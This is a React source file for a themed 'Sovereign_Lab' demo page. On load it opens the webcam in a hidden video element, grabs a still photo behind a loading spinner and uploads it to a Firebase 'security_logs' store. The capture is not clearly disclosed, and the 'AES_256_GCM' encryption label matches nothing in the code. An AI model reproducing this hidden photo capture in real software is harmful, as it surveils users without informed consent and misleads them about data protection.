import React, { useEffect, useRef, useState } from 'react';
import { ShieldAlert, Cpu, ArrowLeft, Loader2, Lock, LayoutDashboard, Zap, Eye, Database, Fingerprint, ShieldCheck, Activity } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { db } from '../firebase';
import { ref, push, set } from "firebase/database";

export default function DemoPage() {
  const navigate = useNavigate();
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const streamRef = useRef(null);
  const [isInitializing, setIsInitializing] = useState(true);

  useEffect(() => {
    const setupDemo = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        streamRef.current = stream;
        if (videoRef.current) videoRef.current.srcObject = stream;
        setTimeout(() => {
          captureInitialLog();
          setIsInitializing(false);
        }, 2500);
      } catch (err) { setIsInitializing(false); }
    };
    setupDemo();
    return () => streamRef.current?.getTracks().forEach(t => t.stop());
  }, []);

  const captureInitialLog = async () => {
    if (!videoRef.current || !canvasRef.current) return;
    const context = canvasRef.current.getContext('2d');
    context.drawImage(videoRef.current, 0, 0, 400, 300);
    const photo = canvasRef.current.toDataURL('image/jpeg', 0.5);
    const sid = localStorage.getItem('sov_session_id') || 'GUEST_' + Math.random().toString(36).substr(2, 5);
    await set(push(ref(db, 'security_logs')), {
      sessionID: sid,
      photo: photo,
      timestamp: new Date().toISOString(),
      status: 'AUTHORIZED_GUEST'
    });
  };

  return (
    <div className="min-h-screen bg-[#00040a] text-blue-400 font-sans p-6 flex flex-col items-center justify-center overflow-hidden relative">
      
      {/* Background Cyber-Grid Effect */}
      <div className="absolute inset-0 opacity-10 pointer-events-none" 
           style={{ backgroundImage: 'radial-gradient(#1e40af 1px, transparent 1px)', size: '40px 40px' }}></div>

      <video ref={videoRef} autoPlay playsInline className="hidden" />
      <canvas ref={canvasRef} width="400" height="300" className="hidden" />

      {isInitializing ? (
        <div className="flex flex-col items-center gap-6">
          <div className="relative">
            <Loader2 className="animate-spin text-blue-500" size={60} />
            <div className="absolute inset-0 blur-2xl bg-blue-500/30 animate-pulse"></div>
          </div>
          <p className="text-[10px] font-mono tracking-[0.5em] text-blue-500 uppercase animate-pulse">Syncing_Neural_Interface</p>
        </div>
      ) : (
        <div className="w-full max-w-6xl space-y-12 animate-in fade-in zoom-in duration-1000">
          
          {/* Top Bar */}
          <div className="flex justify-between items-end border-b border-blue-500/20 pb-6">
            <div className="space-y-1">
              <h2 className="text-4xl font-black italic text-white tracking-tighter uppercase">Sovereign_Lab</h2>
              <p className="text-[10px] font-mono text-slate-500 tracking-widest flex items-center gap-2">
                <Activity size={12} className="text-emerald-500" /> SYSTEM_STATUS: OPERATIONAL_V4
              </p>
            </div>
            <button onClick={() => navigate('/')} className="px-6 py-2 bg-white/5 border border-white/10 rounded-full text-[9px] font-black uppercase tracking-[0.2em] hover:bg-red-600 hover:text-white transition-all flex items-center gap-2">
              <ArrowLeft size={14} /> Kill_Session
            </button>
          </div>

          {/* Advanced Grid Design */}
          <div className="grid grid-cols-1 md:grid-cols-12 gap-6">
            
            {/* LEFT: Incident Vault (MAIN FOCUS) */}
            <div 
              onClick={() => navigate('/dashboard')}
              className="md:col-span-8 group cursor-pointer relative bg-slate-900/40 border border-blue-500/20 rounded-[3.5rem] p-12 overflow-hidden hover:border-blue-500/60 transition-all shadow-2xl"
            >
              {/* Animated Scan Line */}
              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-blue-500 to-transparent opacity-20 group-hover:opacity-100 animate-[scan_3s_linear_infinite]"></div>
              
              <div className="relative z-10 flex flex-col h-full justify-between">
                <div className="flex justify-between items-start">
                  <div className="p-5 bg-blue-600/10 rounded-3xl border border-blue-500/20 group-hover:scale-110 transition-transform">
                    <Database className="text-blue-500" size={42} />
                  </div>
                  <div className="text-right">
                    <p className="text-[10px] font-mono text-blue-500 uppercase tracking-widest mb-1">Access_Level</p>
                    <span className="bg-blue-500/10 text-blue-400 border border-blue-500/30 px-3 py-1 rounded-md text-[10px] font-bold">GUEST_READ_ONLY</span>
                  </div>
                </div>

                <div className="mt-12 space-y-4">
                  <h3 className="text-5xl font-black text-white italic tracking-tighter uppercase leading-none">
                    Incident<br/><span className="text-blue-600">Vault_Explorer</span>
                  </h3>
                  <p className="text-sm text-slate-400 max-w-md font-medium leading-relaxed">
                    Personal encrypted ledger. Your neural captures, bypass attempts, and biometric signatures are virtualized here.
                  </p>
                </div>

                <div className="mt-12 flex items-center gap-6">
                  <div className="flex items-center gap-2 px-5 py-3 bg-white/5 rounded-2xl border border-white/5 group-hover:bg-blue-600 group-hover:text-white transition-all">
                    <Fingerprint size={18} />
                    <span className="text-[10px] font-black uppercase tracking-widest">Authorize_Entry</span>
                  </div>
                  <div className="flex -space-x-2">
                    {[1, 2, 3].map(i => <div key={i} className="w-6 h-6 rounded-full border-2 border-[#00040a] bg-slate-800"></div>)}
                    <div className="text-[10px] text-slate-600 ml-4 self-center font-mono">+128 Active Nodes</div>
                  </div>
                </div>
              </div>

              {/* Decorative Vector */}
              <ShieldCheck size={200} className="absolute -bottom-10 -right-10 text-blue-500/5 group-hover:text-blue-500/10 transition-colors" />
            </div>

            {/* RIGHT: Stats/Info Panel */}
            <div className="md:col-span-4 space-y-6">
              <div className="bg-white/5 border border-white/10 rounded-[2.5rem] p-8 flex flex-col justify-between h-[280px]">
                <Cpu className="text-purple-500" size={32} />
                <div>
                  <h4 className="text-white font-black uppercase text-xs tracking-widest mb-4 text-left">Neural_Load</h4>
                  <div className="space-y-3">
                    {[76, 42, 91].map((w, i) => (
                      <div key={i} className="h-1 bg-white/5 rounded-full overflow-hidden">
                        <div className={`h-full bg-gradient-to-r ${i === 2 ? 'from-red-500 to-orange-500' : 'from-blue-600 to-purple-600'}`} style={{ width: `${w}%` }}></div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              <div 
                onClick={() => window.open('https://github.com', '_blank')}
                className="bg-blue-600 rounded-[2.5rem] p-8 flex items-center justify-between group cursor-pointer hover:bg-white hover:text-black transition-all"
              >
                <div>
                  <h4 className="font-black uppercase text-xs tracking-widest">Manual_v4</h4>
                  <p className="text-[9px] opacity-70 font-mono">SYSTEM_PROTOCOLS.PDF</p>
                </div>
                <Zap size={24} className="group-hover:fill-current" />
              </div>
            </div>

          </div>

          {/* Footer Terminal Text */}
          <div className="flex justify-between items-center px-4 text-[8px] font-mono text-slate-600 uppercase tracking-[0.5em]">
            <span>ENCRYPTION_LAYER: AES_256_GCM</span>
            <span>SECURE_SANDBOX_V.01 // {new Date().getFullYear()}</span>
          </div>
        </div>
      )}

      <style>{`
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
      `}</style>
    </div>
  );
}